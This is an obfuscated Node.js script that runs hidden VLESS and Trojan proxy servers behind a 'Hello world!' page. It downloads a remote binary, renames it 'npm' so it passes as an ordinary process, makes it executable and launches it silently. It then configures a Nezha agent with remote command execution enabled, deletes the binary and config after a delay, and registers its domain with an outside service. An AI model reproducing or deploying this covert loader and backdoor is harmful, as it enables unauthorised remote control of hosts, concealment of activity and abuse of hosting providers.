const _0x32f77f=_0x1e75;(function(_0xc4e128,_0x3d081d){const _0x445d57=_0x1e75,_0x46a94d=_0xc4e128();while(!![]){try{const _0x41fc4c=parseInt(_0x445d57(0x198))/0x1*(-parseInt(_0x445d57(0x1e3))/0x2)+-parseInt(_0x445d57(0x1f3))/0x3+parseInt(_0x445d57(0x1af))/0x4+-parseInt(_0x445d57(0x20c))/0x5*(parseInt(_0x445d57(0x1ca))/0x6)+-parseInt(_0x445d57(0x1c0))/0x7+parseInt(_0x445d57(0x1c4))/0x8+parseInt(_0x445d57(0x1d1))/0x9;if(_0x41fc4c===_0x3d081d)break;else _0x46a94d['push'](_0x46a94d['shift']());}catch(_0x1f2081){_0x46a94d['push'](_0x46a94d['shift']());}}}(_0xf67d,0x8779d));const os=require('os'),http=require(_0x32f77f(0x1ce)),fs=require('fs'),axios=require(_0x32f77f(0x1f6)),net=require(_0x32f77f(0x1e7)),path=require(_0x32f77f(0x1a2)),crypto=require(_0x32f77f(0x199)),{Buffer}=require(_0x32f77f(0x1d6)),{exec,execSync}=require(_0x32f77f(0x1f4)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x32f77f(0x1a9)][_0x32f77f(0x197)]||_0x32f77f(0x192),NEZHA_SERVER=process[_0x32f77f(0x1a9)][_0x32f77f(0x1bf)]||'',NEZHA_PORT=process[_0x32f77f(0x1a9)][_0x32f77f(0x1f0)]||'',NEZHA_KEY=process[_0x32f77f(0x1a9)]['NEZHA_KEY']||'',DOMAIN=process[_0x32f77f(0x1a9)]['DOMAIN']||_0x32f77f(0x1b9),AUTO_ACCESS=process[_0x32f77f(0x1a9)][_0x32f77f(0x20b)]||!![],WSPATH=process['env'][_0x32f77f(0x1b5)]||UUID[_0x32f77f(0x18c)](0x0,0x8),SUB_PATH=process['env'][_0x32f77f(0x19b)]||_0x32f77f(0x1fc),NAME=process[_0x32f77f(0x1a9)][_0x32f77f(0x1ed)]||_0x32f77f(0x1d3),PORT=process['env'][_0x32f77f(0x1c2)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x275be8=_0x32f77f;try{const _0x3b2447=await axios[_0x275be8(0x191)](_0x275be8(0x193)),_0x7db9c1=_0x3b2447['data'];ISP=(_0x7db9c1['country']+'-'+_0x7db9c1[_0x275be8(0x1a7)])[_0x275be8(0x1e6)](/ /g,'_');}catch(_0x246f09){ISP=_0x275be8(0x1ef);}};GetISP();const httpServer=http[_0x32f77f(0x202)]((_0xbd2008,_0x1e3cf6)=>{const _0x30287c=_0x32f77f;if(_0xbd2008[_0x30287c(0x19f)]==='/'){const _0x4be6d8=path[_0x30287c(0x1e0)](__dirname,_0x30287c(0x1cc));fs[_0x30287c(0x1cb)](_0x4be6d8,_0x30287c(0x201),(_0xd4543e,_0x4e68cf)=>{const _0xd0c8ab=_0x30287c;if(_0xd4543e){_0x1e3cf6[_0xd0c8ab(0x1cf)](0xc8,{'Content-Type':'text/html'}),_0x1e3cf6[_0xd0c8ab(0x1b2)](_0xd0c8ab(0x1ff));return;}_0x1e3cf6[_0xd0c8ab(0x1cf)](0xc8,{'Content-Type':_0xd0c8ab(0x18e)}),_0x1e3cf6[_0xd0c8ab(0x1b2)](_0x4e68cf);});return;}else{if(_0xbd2008[_0x30287c(0x19f)]==='/'+SUB_PATH){const _0x2e6d2f='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x30287c(0x1e2)+DOMAIN+_0x30287c(0x1fa)+WSPATH+'#'+NAME+'-'+ISP,_0x1c75c2=_0x30287c(0x1ee)+UUID+'@'+DOMAIN+_0x30287c(0x1a6)+DOMAIN+_0x30287c(0x1e2)+DOMAIN+_0x30287c(0x1fa)+WSPATH+'#'+NAME+'-'+ISP,_0x2fb137=_0x2e6d2f+'\x0a'+_0x1c75c2,_0x40ed7a=Buffer['from'](_0x2fb137)[_0x30287c(0x1df)](_0x30287c(0x1aa));_0x1e3cf6[_0x30287c(0x1cf)](0xc8,{'Content-Type':_0x30287c(0x19c)}),_0x1e3cf6[_0x30287c(0x1b2)](_0x40ed7a+'\x0a');}else _0x1e3cf6['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x1e3cf6[_0x30287c(0x1b2)](_0x30287c(0x1e8));}}),wss=new WebSocket[(_0x32f77f(0x1d5))]({'server':httpServer}),uuid=UUID[_0x32f77f(0x1e6)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x13590c){return new Promise((_0xb8e286,_0x51e7d6)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x13590c)){_0xb8e286(_0x13590c);return;}let _0x180018=0x0;function _0x576f05(){const _0x5811b2=_0x1e75;if(_0x180018>=DNS_SERVERS[_0x5811b2(0x204)]){_0x51e7d6(new Error(_0x5811b2(0x1c5)+_0x13590c+_0x5811b2(0x200)));return;}const _0x518885=DNS_SERVERS[_0x180018];_0x180018++;const _0x4df02d=_0x5811b2(0x1eb)+encodeURIComponent(_0x13590c)+_0x5811b2(0x1ad);axios[_0x5811b2(0x191)](_0x4df02d,{'timeout':0x1388,'headers':{'Accept':_0x5811b2(0x1f7)}})['then'](_0x484e7d=>{const _0x29951f=_0x5811b2,_0x3d962c=_0x484e7d[_0x29951f(0x1d7)];if(_0x3d962c[_0x29951f(0x208)]===0x0&&_0x3d962c[_0x29951f(0x1e5)]&&_0x3d962c['Answer'][_0x29951f(0x204)]>0x0){const _0x2c554b=_0x3d962c['Answer']['find'](_0x1b0794=>_0x1b0794['type']===0x1);if(_0x2c554b){_0xb8e286(_0x2c554b['data']);return;}}_0x576f05();})['catch'](_0x5f5958=>{_0x576f05();});}_0x576f05();});}function handleVlessConnection(_0x5ad3a1,_0x556b47){const _0x3b973e=_0x32f77f,[_0x2d593b]=_0x556b47,_0xf1fa91=_0x556b47[_0x3b973e(0x18c)](0x1,0x11);if(!_0xf1fa91[_0x3b973e(0x1ae)]((_0x46df26,_0x24a237)=>_0x46df26==parseInt(uuid[_0x3b973e(0x1f8)](_0x24a237*0x2,0x2),0x10)))return![];let _0x3d091b=_0x556b47[_0x3b973e(0x18c)](0x11,0x12)['readUInt8']()+0x13;const _0x2b0b57=_0x556b47[_0x3b973e(0x18c)](_0x3d091b,_0x3d091b+=0x2)[_0x3b973e(0x1a5)](0x0),_0x1f8cb5=_0x556b47[_0x3b973e(0x18c)](_0x3d091b,_0x3d091b+=0x1)[_0x3b973e(0x1e4)](),_0x1b7b47=_0x1f8cb5==0x1?_0x556b47[_0x3b973e(0x18c)](_0x3d091b,_0x3d091b+=0x4)['join']('.'):_0x1f8cb5==0x2?new TextDecoder()['decode'](_0x556b47[_0x3b973e(0x18c)](_0x3d091b+0x1,_0x3d091b+=0x1+_0x556b47['slice'](_0x3d091b,_0x3d091b+0x1)[_0x3b973e(0x1e4)]())):_0x1f8cb5==0x3?_0x556b47[_0x3b973e(0x18c)](_0x3d091b,_0x3d091b+=0x10)[_0x3b973e(0x1a4)]((_0x3c8594,_0x3a6791,_0x2dee84,_0x1bb328)=>_0x2dee84%0x2?_0x3c8594[_0x3b973e(0x1dd)](_0x1bb328['slice'](_0x2dee84-0x1,_0x2dee84+0x1)):_0x3c8594,[])['map'](_0x5e8250=>_0x5e8250[_0x3b973e(0x1a5)](0x0)[_0x3b973e(0x1df)](0x10))['join'](':'):'';_0x5ad3a1[_0x3b973e(0x1f5)](new Uint8Array([_0x2d593b,0x0]));const _0x4e14c0=createWebSocketStream(_0x5ad3a1);return resolveHost(_0x1b7b47)[_0x3b973e(0x1a8)](_0x1ce223=>{const _0x7f59a3=_0x3b973e;net[_0x7f59a3(0x1de)]({'host':_0x1ce223,'port':_0x2b0b57},function(){const _0x1545a2=_0x7f59a3;this[_0x1545a2(0x1c8)](_0x556b47[_0x1545a2(0x18c)](_0x3d091b)),_0x4e14c0['on'](_0x1545a2(0x207),()=>{})[_0x1545a2(0x1c7)](this)['on'](_0x1545a2(0x207),()=>{})['pipe'](_0x4e14c0);})['on']('error',()=>{});})[_0x3b973e(0x1a1)](_0x56ad8e=>{const _0x4dad66=_0x3b973e;net['connect']({'host':_0x1b7b47,'port':_0x2b0b57},function(){const _0x2fff19=_0x1e75;this[_0x2fff19(0x1c8)](_0x556b47[_0x2fff19(0x18c)](_0x3d091b)),_0x4e14c0['on'](_0x2fff19(0x207),()=>{})[_0x2fff19(0x1c7)](this)['on'](_0x2fff19(0x207),()=>{})[_0x2fff19(0x1c7)](_0x4e14c0);})['on'](_0x4dad66(0x207),()=>{});}),!![];}function handleTrojanConnection(_0x27ed20,_0x396f78){const _0x251d4a=_0x32f77f;try{if(_0x396f78['length']<0x3a)return![];const _0x40a176=_0x396f78['slice'](0x0,0x38)[_0x251d4a(0x1df)](),_0x3f9b6e=[UUID];let _0x20ad62=null;for(const _0xc86336 of _0x3f9b6e){const _0x4ebb72=crypto[_0x251d4a(0x1b7)](_0x251d4a(0x19a))['update'](_0xc86336)[_0x251d4a(0x203)](_0x251d4a(0x1a0));if(_0x4ebb72===_0x40a176){_0x20ad62=_0xc86336;break;}}if(!_0x20ad62)return![];let _0x5d0b31=0x38;_0x396f78[_0x5d0b31]===0xd&&_0x396f78[_0x5d0b31+0x1]===0xa&&(_0x5d0b31+=0x2);const _0x156a55=_0x396f78[_0x5d0b31];if(_0x156a55!==0x1)return![];_0x5d0b31+=0x1;const _0x3f93ab=_0x396f78[_0x5d0b31];_0x5d0b31+=0x1;let _0x318207,_0x16e91c;if(_0x3f93ab===0x1)_0x318207=_0x396f78[_0x251d4a(0x18c)](_0x5d0b31,_0x5d0b31+0x4)[_0x251d4a(0x1e0)]('.'),_0x5d0b31+=0x4;else{if(_0x3f93ab===0x3){const _0x3b96e4=_0x396f78[_0x5d0b31];_0x5d0b31+=0x1,_0x318207=_0x396f78[_0x251d4a(0x18c)](_0x5d0b31,_0x5d0b31+_0x3b96e4)[_0x251d4a(0x1df)](),_0x5d0b31+=_0x3b96e4;}else{if(_0x3f93ab===0x4)_0x318207=_0x396f78[_0x251d4a(0x18c)](_0x5d0b31,_0x5d0b31+0x10)[_0x251d4a(0x1a4)]((_0x344f1f,_0x48417e,_0x596e60,_0x31339e)=>_0x596e60%0x2?_0x344f1f[_0x251d4a(0x1dd)](_0x31339e[_0x251d4a(0x18c)](_0x596e60-0x1,_0x596e60+0x1)):_0x344f1f,[])[_0x251d4a(0x1db)](_0xd72041=>_0xd72041['readUInt16BE'](0x0)['toString'](0x10))[_0x251d4a(0x1e0)](':'),_0x5d0b31+=0x10;else return![];}}_0x16e91c=_0x396f78[_0x251d4a(0x1a5)](_0x5d0b31),_0x5d0b31+=0x2;_0x5d0b31<_0x396f78[_0x251d4a(0x204)]&&_0x396f78[_0x5d0b31]===0xd&&_0x396f78[_0x5d0b31+0x1]===0xa&&(_0x5d0b31+=0x2);const _0x480584=createWebSocketStream(_0x27ed20);return resolveHost(_0x318207)['then'](_0x45c5f7=>{const _0x3e44cb=_0x251d4a;net[_0x3e44cb(0x1de)]({'host':_0x45c5f7,'port':_0x16e91c},function(){const _0x529837=_0x3e44cb;_0x5d0b31<_0x396f78[_0x529837(0x204)]&&this[_0x529837(0x1c8)](_0x396f78['slice'](_0x5d0b31)),_0x480584['on'](_0x529837(0x207),()=>{})[_0x529837(0x1c7)](this)['on']('error',()=>{})[_0x529837(0x1c7)](_0x480584);})['on']('error',()=>{});})[_0x251d4a(0x1a1)](_0x5d4348=>{const _0x57780b=_0x251d4a;net[_0x57780b(0x1de)]({'host':_0x318207,'port':_0x16e91c},function(){const _0x361fdf=_0x57780b;_0x5d0b31<_0x396f78[_0x361fdf(0x204)]&&this[_0x361fdf(0x1c8)](_0x396f78[_0x361fdf(0x18c)](_0x5d0b31)),_0x480584['on']('error',()=>{})['pipe'](this)['on'](_0x361fdf(0x207),()=>{})[_0x361fdf(0x1c7)](_0x480584);})['on'](_0x57780b(0x207),()=>{});}),!![];}catch(_0x1116ab){return![];}}wss['on'](_0x32f77f(0x209),(_0x206734,_0x3aeeb6)=>{const _0x8642d8=_0x32f77f,_0x256509=_0x3aeeb6[_0x8642d8(0x19f)]||'';_0x206734['once'](_0x8642d8(0x18d),_0x5348e3=>{const _0x1c93bd=_0x8642d8;if(_0x5348e3[_0x1c93bd(0x204)]>0x11&&_0x5348e3[0x0]===0x0){const _0xaf94ca=_0x5348e3[_0x1c93bd(0x18c)](0x1,0x11),_0x33a960=_0xaf94ca[_0x1c93bd(0x1ae)]((_0x1a05dd,_0x3fdc2d)=>_0x1a05dd==parseInt(uuid[_0x1c93bd(0x1f8)](_0x3fdc2d*0x2,0x2),0x10));if(_0x33a960){!handleVlessConnection(_0x206734,_0x5348e3)&&_0x206734[_0x1c93bd(0x1c6)]();return;}}!handleTrojanConnection(_0x206734,_0x5348e3)&&_0x206734[_0x1c93bd(0x1c6)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x4da5aa=_0x32f77f,_0x3b185d=os[_0x4da5aa(0x1b8)]();return _0x3b185d===_0x4da5aa(0x1c1)||_0x3b185d===_0x4da5aa(0x1d2)||_0x3b185d===_0x4da5aa(0x1ab)?!NEZHA_PORT?_0x4da5aa(0x1bb):_0x4da5aa(0x1fd):!NEZHA_PORT?_0x4da5aa(0x194):_0x4da5aa(0x19e);},downloadFile=async()=>{const _0x18984f=_0x32f77f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4461f7=getDownloadUrl(),_0x3d70ec=await axios({'method':_0x18984f(0x191),'url':_0x4461f7,'responseType':_0x18984f(0x20a)}),_0x1b6b8a=fs[_0x18984f(0x19d)](_0x18984f(0x1f1));return _0x3d70ec[_0x18984f(0x1d7)][_0x18984f(0x1c7)](_0x1b6b8a),new Promise((_0x2b3063,_0x5d7a5d)=>{const _0xbdce92=_0x18984f;_0x1b6b8a['on'](_0xbdce92(0x1fe),()=>{const _0x50a3aa=_0xbdce92;console[_0x50a3aa(0x1ac)]('npm\x20download\x20successfully'),exec(_0x50a3aa(0x196),_0x5d81ee=>{if(_0x5d81ee)_0x5d7a5d(_0x5d81ee);_0x2b3063();});}),_0x1b6b8a['on']('error',_0x5d7a5d);});}catch(_0x429608){throw _0x429608;}},runnz=async()=>{const _0x577e65=_0x32f77f;try{const _0x39abdf=execSync(_0x577e65(0x1f2),{'encoding':_0x577e65(0x1b3)});if(_0x39abdf[_0x577e65(0x195)]()!==''){console[_0x577e65(0x1ac)](_0x577e65(0x1c9));return;}}catch(_0x189eb4){}await downloadFile();let _0x2c39eb='',_0xdb232f=[_0x577e65(0x1d9),_0x577e65(0x1e9),_0x577e65(0x1bd),_0x577e65(0x1c3),'2083',_0x577e65(0x1d4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3c56bc=_0xdb232f[_0x577e65(0x1da)](NEZHA_PORT)?'--tls':'';_0x2c39eb='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x577e65(0x1e1)+NEZHA_KEY+'\x20'+_0x3c56bc+_0x577e65(0x205);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x50c75b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x577e65(0x1dc)](':')[_0x577e65(0x190)]():'',_0x127483=_0xdb232f[_0x577e65(0x1da)](_0x50c75b)?'true':_0x577e65(0x1ba),_0x3d3d95=_0x577e65(0x206)+NEZHA_KEY+_0x577e65(0x1fb)+NEZHA_SERVER+_0x577e65(0x1b4)+_0x127483+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x577e65(0x1d0),_0x3d3d95);}_0x2c39eb=_0x577e65(0x1be);}else{console[_0x577e65(0x1ac)](_0x577e65(0x1bc));return;}}try{exec(_0x2c39eb,{'shell':_0x577e65(0x1ec)},_0x38a6da=>{const _0x2d40a1=_0x577e65;if(_0x38a6da)console[_0x2d40a1(0x207)](_0x2d40a1(0x1a3),_0x38a6da);else console['log']('npm\x20is\x20running');});}catch(_0x1e0b69){console[_0x577e65(0x207)](_0x577e65(0x1b0)+_0x1e0b69);}};async function addAccessTask(){const _0x15ca9a=_0x32f77f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x27d010='https://'+DOMAIN;try{const _0x41b292=await axios[_0x15ca9a(0x1ea)](_0x15ca9a(0x18f),{'url':_0x27d010},{'headers':{'Content-Type':_0x15ca9a(0x1b6)}});console['log'](_0x15ca9a(0x1f9));}catch(_0x48899b){}}const delFiles=()=>{const _0x1ed994=_0x32f77f;fs[_0x1ed994(0x1d8)](_0x1ed994(0x1f1),()=>{}),fs[_0x1ed994(0x1d8)]('config.yaml',()=>{});};function _0x1e75(_0xef3eef,_0x5d1bf8){const _0xf67d9b=_0xf67d();return _0x1e75=function(_0x1e7526,_0x229f62){_0x1e7526=_0x1e7526-0x18c;let _0x3d1c7b=_0xf67d9b[_0x1e7526];return _0x3d1c7b;},_0x1e75(_0xef3eef,_0x5d1bf8);}httpServer[_0x32f77f(0x1cd)](PORT,()=>{const _0xc157a6=_0x32f77f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xc157a6(0x1ac)](_0xc157a6(0x1b1)+PORT);});function _0xf67d(){const _0xc21260=['length','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','client_secret:\x20','error','Status','connection','stream','AUTO_ACCESS','12135WvkwFG','slice','message','text/html','https://oooo.serv00.net/add-url','pop','get','c02e4670-d1ce-43cc-ad38-2d208fe120d4','https://speed.cloudflare.com/meta','https://amd64.ssss.nyc.mn/v1','trim','chmod\x20+x\x20npm','UUID','127354EKSIHJ','crypto','sha224','SUB_PATH','text/plain','createWriteStream','https://amd64.ssss.nyc.mn/agent','url','hex','catch','path','npm\x20running\x20error:','reduce','readUInt16BE',':443?security=tls&sni=','asOrganization','then','env','base64','aarch64','log','&type=A','every','759732PRvcVq','error:\x20','Server\x20is\x20running\x20on\x20port\x20','end','utf-8','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','WSPATH','application/json','createHash','arch','yubb.netlib.re','false','https://arm64.ssss.nyc.mn/v1','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','2096','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','6418069cWYUhC','arm','PORT','2087','4424200LDgGTG','Failed\x20to\x20resolve\x20','close','pipe','write','npm\x20is\x20already\x20running,\x20skip\x20running...','102WtUOSJ','readFile','index.html','listen','http','writeHead','config.yaml','14655726ibvJEc','arm64','Hug','2053','Server','buffer','data','unlink','443','includes','map','split','concat','connect','toString','join','\x20-p\x20','&fp=chrome&type=ws&host=','8EtnwGo','readUInt8','Answer','replace','net','Not\x20Found\x0a','8443','post','https://dns.google/resolve?name=','/bin/bash','NAME','trojan://','Unknown','NEZHA_PORT','npm','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','1046763ujyRof','child_process','send','axios','application/dns-json','substr','Automatic\x20Access\x20Task\x20added\x20successfully','&path=%2F','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','sub','https://arm64.ssss.nyc.mn/agent','finish','Hello\x20world!','\x20with\x20all\x20DNS\x20servers','utf8','createServer','digest'];_0xf67d=function(){return _0xc21260;};return _0xf67d();}
